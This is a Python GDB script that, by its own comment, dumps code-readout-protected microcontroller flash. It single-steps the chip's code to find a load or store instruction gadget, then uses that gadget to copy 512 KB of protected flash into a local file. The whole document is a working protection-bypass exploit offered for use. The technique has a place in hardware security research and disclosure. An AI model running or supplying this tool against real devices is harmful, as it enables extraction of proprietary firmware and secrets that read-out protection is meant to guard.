#!/usr/bin/env python

# Dumps code-readout protected memory via register readout technique
# See https://www.youtube.com/watch?v=DTuzuaiQL_Q

import random
import struct

import gdb


def determine_read_op(a):
    for r in range(13):
        n = 0xde000000 + random.randint(0, 0xffffff)

        gdb.execute('set {int}0x20009124 = 0x%08X' % n)

        for r2 in range(13):
            gdb.execute('set $r%d = 0x%08X' % (r2, 0x20009124 if r2 == r else 0x1337f00d))

        gdb.execute('set $pc = 0x%x' % a)
        gdb.execute('si')

        for r2 in range(13):
            if r2 == r:
                continue
            v = int(gdb.parse_and_eval("$r%d" % r2)) & 0xffffffff
            if v == n:
                return r, r2

    return None


def find_read():
    for a in range(0x8004201, 0x8004001 + 0x10000, 2):
        print 'Addr 0x%08X' % a

        n = 0xde000000 + random.randint(0, 0xffffff)

        gdb.execute('set {int}0x20009124 = 0x%08X' % n)

        for r in range(13):
            gdb.execute('set $r%d = 0x20009124' % r)

        gdb.execute('set $pc = 0x%x' % a)
        gdb.execute('si')

        for r in range(13):
            v = int(gdb.parse_and_eval("$r%d" % r)) & 0xffffffff
            if v != 0x20009124:
                print 'Reg %d changed to 0x%08X' % (r, v)
                if v == n:
                    op = determine_read_op(a)
                    if op:
                        return a, op

    return None


def determine_write_op(a):
    for r in range(13):
        n = 0xde000000 + (random.randint(0, 0xffffff) & 0xfffff0)

        gdb.execute('set {int}0x20000000 = 0')

        for r2 in range(13):
            gdb.execute('set $r%d = 0x%08X' % (r2, 0x20000000 if r2 == r else n + r2))

        gdb.execute('set $pc = 0x%x' % a)
        gdb.execute('si')

        v = int(gdb.parse_and_eval("*(unsigned int *)0x20000000")) & 0xffffffff
        if n <= v <= n + 13 and r != v - n:
            return r, v - n

    return None


def find_write():
    for a in range(0x8004201, 0x8004001 + 0x10000, 2):
        print 'Addr 0x%08X' % a

        n = 0xde000000 + (random.randint(0, 0xffffff) & 0xfffff0)

        gdb.execute('set {int}0x20000000 = 0')

        for r in range(13):
            gdb.execute('set $r%d = 0x20000000' % r)

        gdb.execute('set $pc = 0x%x' % a)
        gdb.execute('si')

        v = int(gdb.parse_and_eval("*(unsigned int *)0x20000000")) & 0xffffffff
        if v != 0:
            print 'Mem changed to 0x%08X' % v
            if v == 0x20000000:
                op = determine_write_op(a)
                if op:
                    return a, op

    return None


def dump(aop, f):
    gdb.execute('set logging file /dev/null')
    gdb.execute('set logging redirect on')
    gdb.execute('set logging on')

    addr, (reg_from, reg_to) = aop
    r = ''
    for m in range(0, 512 * 1024, 4):
        if not m & 0x3ff:
            gdb.execute('set logging off')
            print '%dkB done...' % (m / 1024)
            gdb.execute('set logging on')
            f.flush()
        gdb.execute('set $r%d = 0x%08X' % (reg_from, 0x8000000 + m))
        gdb.execute('set $pc = 0x%x' % addr)
        gdb.execute('si')
        f.write(struct.pack('<I', int(gdb.parse_and_eval("$r%d" % reg_to)) & 0xffffffff))

    gdb.execute('set logging off')


gdb.execute('set {int}0x20000000 = 0')

DO_READ = True

if DO_READ:
    aop = find_read()
    if aop is not None:
        addr, (reg_from, reg_to) = aop
        print 'Addr 0x%08X is from r%d to r%d' % (addr, reg_from, reg_to)
        with open('/tmp/dump.bin', 'wb') as f:
            dump(aop, f)
else:
    aop = find_write()
    if aop is not None:
        addr, (reg_addr, reg_val) = aop
        print 'Addr 0x%08X is from r%d val r%d' % (addr, reg_addr, reg_val)
